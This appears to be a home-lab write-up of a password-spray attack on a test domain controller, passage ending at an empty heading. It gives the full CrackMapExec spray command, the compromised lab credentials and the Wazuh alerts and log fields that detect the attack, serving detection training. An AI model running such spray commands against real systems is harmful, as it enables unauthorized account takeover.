# Scenario 01 — Password Spray Attack

## Overview
**Date:** April 7, 2026  
**Attacker:** Kali Linux (10.0.30.12)  
**Target:** DC01 — cyberlab.local Domain Controller (10.0.30.131)  
**Tool Used:** CrackMapExec v6.x  
**MITRE ATT&CK:** T1110.003 — Password Spraying  
**Result:** Two accounts compromised including domain Administrator  

---

## Attack Command
```bash
crackmapexec smb 10.0.30.131 -u Administrator vuser DC_Hacker_Test \
-p Password123! Winter2024! Welcome1 \
-d cyberlab.local --continue-on-success
```

---

## Attack Results
| Account | Password | Result |
|---|---|---|
| Administrator | Password123! | SUCCESS — Pwn3d! (Domain Admin) |
| Administrator | Winter2024! | FAILED |
| Administrator | Welcome1 | FAILED |
| vuser | Password123! | SUCCESS |
| vuser | Winter2024! | FAILED |
| vuser | Welcome1 | FAILED |
| DC_Hacker_Test | Password123! | FAILED |
| DC_Hacker_Test | Winter2024! | FAILED |
| DC_Hacker_Test | Welcome1 | FAILED |

---

## Wazuh Alerts Generated

### Rule 60122 — Logon Failure (Level 5)
**Description:** Logon Failure - Unknown user or bad password  
**Windows Event ID:** 4625  
**What it means:** Failed authentication attempt over the network.  
Multiple 60122 alerts in rapid succession from the same source IP 
is the primary indicator of a password spray attack.  
**Key fields to look for:**
- `data.win.eventdata.ipAddress` — attacker source IP
- `data.win.eventdata.logonType: 3` — network logon
- `data.win.eventdata.authenticationPackageName: NTLM`
- `data.win.eventdata.status: 0xC000006D` — wrong credentials
- `data.win.eventdata.subStatus: 0xC000006A` — wrong password 
  (account exists)

---

### Rule 92652 — Successful Remote Logon — Possible Pass-the-Hash (Level 6)
**Description:** Successful Remote Logon Detected - NTLM authentication  
**Windows Event ID:** 4624  
**MITRE ATT&CK:** T1550.002 (Pass the Hash), T1078.002 (Domain Accounts)  
**Tactics:** Defense Evasion, Lateral Movement, Persistence, 
Privilege Escalation, Initial Access  
**Compliance:** GDPR IV_32.2, HIPAA 164.312.b, PCI-DSS 10.2.5, 
NIST 800-53 AC.7/AU.14  

**What it means:** A domain account successfully authenticated 
remotely using NTLM. Wazuh flags this as possible Pass-the-Hash 
because the network pattern is identical whether the attacker used 
a stolen hash or a real password.  

**Key fields:**
- `data.win.eventdata.targetUserName: Administrator` — compromised account
- `data.win.eventdata.ipAddress: 10.0.30.12` — attacker IP
- `data.win.eventdata.logonType: 3` — network logon
- `data.win.eventdata.elevatedToken: Yes` — admin privileges granted
- `data.win.eventdata.impersonationLevel: Impersonation` — can 
  act as Administrator on any domain system
- `data.win.eventdata.lmPackageName: NTLM V2` — NTLMv2 used

---

### Rule 67028 — Special Privileges Assigned to New Logon (Level 3)
**Windows Event ID:** 4672  
**What it means:** The Administrator account was assigned special 
privileges upon logon — confirming this is a high-privilege account. 
Always follows a 4624 for privileged accounts.

---

### Rule 92031 — Discovery Activity Executed (Level 3)
**What it means:** CrackMapExec automatically ran post-exploitation 
discovery commands on DC01 after achieving Pwn3d access. This is 
automated attacker behavior — tools enumerate the environment 
immediately after gaining access.

---

### Rule 92201 — PowerShell Created Scripting File in Temp (Level 9)
**What it means:** CrackMapExec used PowerShell to drop files in 
Windows Temp as part of its post-exploitation activity. File drops 
in Temp by PowerShell are a high-confidence indicator of malicious 
activity.

---

## Windows Event Log Analysis (DC01)

**Event ID 4625 — Failed Logon**
